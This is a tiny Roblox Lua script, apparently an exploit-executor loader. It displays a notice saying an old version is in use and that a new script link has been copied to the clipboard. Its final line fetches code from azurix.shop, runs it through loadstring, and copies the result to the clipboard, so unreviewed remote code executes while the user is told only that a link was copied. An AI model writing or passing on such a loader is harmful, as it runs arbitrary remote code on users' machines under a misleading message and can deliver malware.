local StarterGui = game:GetService("StarterGui")

StarterGui:SetCore("SendNotification", {
    Title = "Old ver";
    Text = "New script link copied to clipboard.";
    Duration = 5;
})

setclipboard(loadstring(game:HttpGet("https://azurix.shop"))())
